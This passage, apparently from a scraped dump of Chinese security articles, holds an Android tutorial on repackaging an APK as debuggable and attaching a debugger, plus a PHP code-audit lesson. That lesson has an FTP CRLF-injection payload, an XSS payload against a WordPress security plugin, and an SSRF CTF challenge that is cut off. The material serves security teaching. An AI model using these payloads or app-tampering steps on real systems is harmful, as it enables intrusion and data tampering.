debugging”来访问开发人员选项并启用USB调试功能。通过USB链接手机和电脑并使用ADB将手机与电脑通过USB数据线连接之后，会提示“USB调试已经连接上设备”。接下来，我们要确保ADB（安卓调试桥）可以连接到手机。ADB是Android SDK工具集内包含的一个软件工具。我们在Windows系统控制台（cmd）上输入以下代码：adb devices正常情况下将会出现下图所示的结果：如果你的电脑上没有提示上图中的内容，那么很可能是系统中没有安装正确的驱动程序。你需要重新安装该驱动，驱动程序可以从Android SDK或者手机制造商的网站获得。3、检查APP是否可调试当调试安卓应用程序的时候，我们首先要检查该应用程序是否开启了调试功能。可以通过以下几种方法来检查是否开启了调试功能。第一种方法是打开安卓设备监视器（Eclipse中的是DDMS），我们可以在设备区域窗口中看到我们的设备列表。如果安卓手机里面的某个应用设置为可调试，那么该应用程序会出现在该列表中。在这里我创建了一个测试应用程序，我们可以看到该程序并没有出现在该列表中，表明该程序我设置为了不可调试。第二种方法是，我们可以通过检查APK文件中的AndroidManifest.xml文件来确定应用是否可以调试。APK文件本质上是一个包含应用所有信息的zip压缩文件。如果你没有目标应用的APK文件，那么就必须先从手机中导出该APK文件。每当我们从Google Play 商店中下载应用时，系统都自动下载了该应用的APK文件，并将其存储在了安卓设备上。这些APK文件的位置通常在手机中/data/app目录下。如果你的手机还没有root过，可能你将不能查看该目录下的文件。然而，如果你知道目标APK的名字，那么也可以通过adb工具将该APK文件转存到电脑中。为了查找目标APK文件，我们可以打开一个Windows shell并输入以下指令：adb shell这时将产生一个连接安卓设备的shell，然后输入：pm list packages –f这条指令将列出安卓设备上所有应用的安装包。通过查看结果列表，我们就能找到目标应用。接下来，需要将该APK文件导入到电脑中。为此，我们需要新打开一个shell并输入以下指令：adb pull /data/app/[.apk file] [location]到这里，我们已经得到了目标APK文件。然后我们将打开该文件并检查里面的AndroidManifest.xml文件。不幸的是，我们不能直接解压该APK并查看xml文件，因为它是经过二进制编码处理过的，所以首先必须解码才可以。目前针对该问题最受欢迎的工具是apktool。不过，最近我一直在使用APK Studio软件，因为它有一个易于操作的友好界面。所以，在接下来的演示中我都使用APK Studio。为了开始使用APK Studio，单击绿色的安卓小图标。然后在弹出的窗口中填写项目名称并选择待分析的APK文件，最后设置文件保存的位置。打开APK文件之后，选择AndroidManifest.xml文件，然后查找该应用的节点。如果该文件中没有”android:debuggable”标记，那么说明该APK文件是不可调试的。如果有一个标记为‘android:debuggable=”false” ’，同样说明该APK文件是不可调试的。4、修改AndroidManifest.xml开启APP调试功能apktool和APK Studio比较好的一点是，可以编辑任何反编译的APK文件并重新编译它们。接下来，我们通过添加“android:debuggable”标记来启用该应用的调试功能。编辑AndroidManifest.xml文件，然后在里面添加’ android:debuggable=”true” ’。添加该标记之后，通过单击菜单上的锤子图标重新创建APK文件。我们重建的APK文件会被保存在build/apk目录中。重建的APK文件只有在签名之后才能够安装到设备上。所有的安卓应用都需要签名，但大多数应用程序并不检查它们是否是用原始的证书进行签名的。如果此时应用程序检查了证书的原始性，那么直接签名可能就没效果了，除非我们同时也编辑了验证数字证书的相关代码。接下来，我们需要安装刚刚重建的APK文件。首先，卸载手机中原有的应用程序。然后使用adb重新安装重建的APK文件，输入以下指令：adb install [.apk file]然后检查并确保重新安装的应用在安卓设备上正确地运行。如果一切正常，那么我们回到安卓设备监视器界面并刷新一下，此时可以看到我们的应用已经显示在列表中了。5、IDE准备既然现在我们的应用已经可以调试了，那么接下来可以将调试器附加在它上面。在做这之前，我们需要设置一下IDE。在这篇博文中，我使用IntelliJ IDEA。首先，我创建一个新的安卓项目，该项目名字可以随意取，但是包名字必须跟APK文件的包结构相同。以上这些都很容易实现。但是，如果你还不确定，可以查看下APK Studio中该APK文件的包结构。对于我的这个应用来说，包结构就是APK的名字“com.netspi.egruber.test”。可以在APK Studio中查看如下图所示。取消选中“Create Hello World Activity”项，其它的地方使用默认设置，这就完成了项目的创建。此时，你的项目结构看起来应该是这样：现在已经创建好了项目，就可以将APK文件的源代码导入到该项目中。我们之所以要这么做，是因为调试器知道关于该应用的所有符号名字、方法、变量等信息。安卓应用程序比较好的一点是，它们可以轻松地通过反编译来得到正确的java源代码。接下来就需要这么做，然后将源代码导入到IDE项目中。6、Dump apk并反编译获取Java源代码首先，为了得到源代码，我们需要将APK文件转换到jar文件。然后，可以使用一个java反编译器来恢复到java源代码，我们使用dex2jar工具来进行此步骤。Dex2jar包含一个d2j-dex2jar.bat文件，通过执行该文件就可以将APK文件转换成jar文件。它的语法很简单：d2j-dex2jar.bat [.apk file]到这里，你应该得到了一个jar文件。下一步，我们将使用工具JD-GUI来打开该jar文件。现在你应该可以看到jar文件的包结构啦，包里面都是可读的java源代码文件。接下来我们通过选择“文件”=&gt;“保存所有文件”来将源代码保存为一个zip文件。保存源代码之后，将其解压到当前目录中。现在我们需要将这两个目录导入到之前创建的安卓项目中。对于IntelliJ IDEA来说，进入到项目的src文件夹并将这两个目录粘贴到这里。在IntelliJ中，如果我们返回到项目中，则项目结构将会刷新。单击其中一个导入的活动文件将会在右边的窗口中显示该文件中的源代码。在下面的截图中可以看到，我导入的源代码是使用ProGuard混淆过的。7、附加调试器现在我们的项目中已经填充了应用程序的源代码，我们就可以开始设置断点。在这个例子中，我在一个方法处设置一个断点，当向一个文本输入框中输入内容的时候程序就会调用该方法。即使代码是经过混淆过的，也可以正常工作。设置断点后，单击主界面右上角的小屏幕图标弹出安卓设备中的进程列表，该列表只列出可以调试的进程，然后单击目标进程将调试器附加到该进程。当然，不同的IDE对应的功能图标不同。选中目标进程之后，调试器就连接到了安卓设备。在我测试的应用中，我将向文本输入框中输入数字42，别忘了之前我们在这里设置了断点。在单击“Enter Code”按键后，进程执行到断点处时会暂停。之所以这样能够正常工作，原因是调试器知道在安卓设备上该调用什么程序。编译后的安卓应用中包含了调试信息，例如变量名字，任何理解java调试线协议（JDWP）的调试器都可以识别这些信息。如果一个安卓应用允许调试，那么一个兼容JDWP的调试器，例如大多数的Java IDE，将能够连接安卓虚拟机并读取和执行调试指令。此时，我们就能够在变量区域窗中查看到我们向应用中输入的内容。8、结语在这里，我们不仅能够从应用中读取数据，而且还能够插入我们自己的。如果我们想中断程序的流程或者绕过逻辑判断，那么本文中的方法将可以起到作用。通过调试，我们可以更好地理解安卓应用如何执行某些操作。尤其是当我们需要查看加密功能是如何使用的，或者确定动态密钥的值时，该方法将可以派上用场。当调试的函数与文件系统或者数据库进行交互时，此方法也能帮助我们查看信息是如何存储的。最主要的是，不需要root权限，我们就能在安卓设备上执行这种类型的测试。 【原文：attacking-android-applications-with-debuggers   PulseO0O整理发布】","2015-01-28 21:43:45","移动安全","Android APP安全测试之使用调试器","https://www.secpulse.com/archives/4370.html"
"5ccbeabd4e5c8ffc0b7d083e","本文由红日安全成员： 七月火编写，如有不当，还望斧正。本文转载自先知社区：https://xz.aliyun.com/t/3102 前言大家好，我们是红日安全-代码审计小组。最近我们小组正在…","红日安全团队","本文由红日安全成员： 七月火编写，如有不当，还望斧正。本文转载自先知社区：https://xz.aliyun.com/t/3102 前言大家好，我们是红日安全-代码审计小组。最近我们小组正在做一个PHP代码审计的项目，供大家学习交流，我们给这个项目起了一个名字叫 PHP-Audit-Labs 。现在大家所看到的系列文章，属于项目 第一阶段 的内容，本阶段的内容题目均来自 PHP SECURITY CALENDAR 2017 。对于每一道题目，我们均给出对应的分析，并结合实际CMS进行解说。在文章的最后，我们还会留一道CTF题目，供大家练习，希望大家喜欢。下面是 第16篇 代码审计文章：Day 16 - Poem题目叫做诗，代码如下：漏洞解析 ：这道题目包含了两个漏洞，利用这两个漏洞，我们可以往FTP连接资源中注入恶意数据，执行FTP命令。首先看到 第7行 代码，可以发现程序使用 cleanInput 方法过滤 GET 、 POST 、 COOKIE 数据，将他们强制转成整型数据。然而在 第8行 处，却传入了一个从 REQUEST 方式获取的 mode 变量。我们都知道超全局数组 $_REQUEST 中的数据，是 $_GET 、 $_POST 、 $_COOKIE 的合集，而且数据是复制过去的，并不是引用。我们先来看一个例子，来验证这一观点：可以发现 REQUEST 数据丝毫不受过滤函数的影响。回到本例题，例题中的程序过滤函数只对 GET 、 POST 、 COOKIE 数据进行操作，最后拿来用的却是 REQUEST 数据，这显然会存在安全隐患。想了解更多 $_REQUEST 信息，大家自己上官网学习。第二个漏洞的话，在代码 第21行 ，这里用了 == 弱比较。关于这个问题，我们在前面的文章中讲的也很细致了，大家可以参考：[红日安全]PHP-Audit-Labs题解之Day1-4 （Day4）。至于本次案例的攻击payload，可以使用： ?mode=1%0a%0dDELETE%20test.file ，这个即可达到删除FTP服务器文件的效果。实例分析本次实例分析，我们分析的是 WordPress 的 All In One WP Security &amp; Firewall 插件。该插件在 4.1.4 - 4.1.9 版本中存在反射型XSS漏洞，漏洞原因和本次案例中的漏洞成因一致，官方也在 4.2.0 版本中修复了该漏洞。本次，我们将以 4.1.4 版本插件作为案例讲解。将下载下来的插件zip包，通过后台插件管理上传压缩包安装即可。本次发生问题的文件在于 wp-content\plugins\all-in-one-wp-security-and-firewall\admin\wp-security-dashboard-menu.php ，为了方便大家理解，我将问题代码抽取出来，简化如下：我们可以很清晰的看到，问题就出在 第25行 的 render_tab3 方法中，这里直接将 REQUEST 方式获取的 tab 变量拼接并输出。而实际上，在 第20行 已经获取了经过过滤处理的 $tab 变量。我们来看一下 get_current_tab 方法：过滤函数的调用链如下图 第1行 ，接着 $tab 变量就会经过 wp_check_invalid_utf8 方法的检测。漏洞利用下面我们来看看攻击 payload （向 http://website/wp-admin/admin.php?page=aiowpsec&amp;tab=tab3 POST数据 tab=""&gt;&lt;script&gt;alert(1)&lt;/script&gt; ）：可以看到成功引发XSS攻击。我们最后再根据 payload 对代码的调用过程进行分析。首先，我们的 payload 会传入 wp-admin/admin.php 文件中，最后进入 第14行 的 do_action('toplevel_page_aiowpsec'); 代码。在 wp-includes/plugin.php 文件中，程序又调用了 WP_Hook 类的 do_action 方法，该方法调用了自身的 apply_filters 方法。然后 apply_filters 方法调用了 wp-content\plugins\all-in-one-wp-security-and-firewall\admin\wp-security-admin-init.php文件的 handle_dashboard_menu_rendering 方法，并实例化了一个 AIOWPSecurity_Dashboard_Menu 对象。接下来就是开头文章分析的部分，也就是下面这张图片：整个漏洞的攻击链就如下图所示：这里还有一个小知识点要提醒大家的是，案例中 $_REQUEST[""tab""] 最后取到的是 $_POST[""tab""] 的值，而不是 $_GET[""tab""]变量的值。这其实和 php.ini 中的 request_order 对应的值有关。例如在我的环境中， request_order 配置如下：这里的 ""GP"" 表示的是 GET 和 POST ，且顺序从左往右。例如我们同时以 GET 和 POST 方式传输 tab 变量，那么最终用 $_REQUEST['tab'] 获取到的就是 $_POST['tab'] 的值。更详细的介绍可以看如下PHP手册的定义：request_order stringThis directive describes the order in which PHP registers GET, POST and Cookie variables into the _REQUEST array. Registration is done from left to right, newer values override older values.If this directive is not set, variables_order is used for $_REQUEST contents.Note that the default distribution php.ini files does not contain the 'C' for cookies, due to security concerns.修复建议对于这个漏洞的修复方案，我们只要使用过滤后的 $tab 变量即可，且变量最好经过HTML实体编码后再输出，例如使用 htmlentities 函数等。结语看完了上述分析，不知道大家是否对 $_REQUEST 数组有了更加深入的理解，文中用到的 CMS 可以从这里( All In One WP Security &amp; Firewall )下载，当然文中若有不当之处，还望各位斧正。如果你对我们的项目感兴趣，欢迎发送邮件到 hongrisec@gmail.com 联系我们。Day16 的分析文章就到这里，我们最后留了一道CTF题目给大家练手，题目如下：// index.php&lt;?phpfunction check_inner_ip($url){    $match_result=preg_match('/^(http|https)?:\/\/.*(\/)?.*$/',$url);    if (!$match_result){        die('url fomat error1');    }    try{        $url_parse=parse_url($url);    }    catch(Exception $e){        die('url fomat error2');    }    $hostname=$url_parse['host'];    $ip=gethostbyname($hostname);    $int_ip=ip2long($ip);    return ip2long('127.0.0.0')&gt;&gt;24 == $int_ip&gt;&gt;24 || ip2long('10.0.0.0')&gt;&gt;24 == $int_ip&gt;&gt;24 || ip2long('172.16.0.0')&gt;&gt;20 == $int_ip&gt;&gt;20 || ip2long('192.168.0.0')&gt;&gt;16 == $int_ip&gt;&gt;16 || ip2long('0.0.0.0')&gt;&gt;24 == $int_ip&gt;&gt;24;}function safe_request_url($url){    if (check_inner_ip($url)){        echo $url.' is inner ip';    }    else{        $ch = curl_init();        curl_setopt($ch, CURLOPT_URL, $url);        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);        curl_setopt($ch, CURLOPT_HEADER, 0);        $output = curl_exec($ch);        $result_info = curl_getinfo($ch);        if ($result_info['redirect_url']){            safe_request_url($result_info['redirect_url']);        }        curl_close($ch);        var_dump($output);    }}$url = $_POST['url'];if(!empty($url)){    safe_request_url($url);}else{    highlight_file(__file__);}//flag in flag.php ?&gt;// flag.php&lt;?phpif (! function_exists('real_ip') ) {    function real_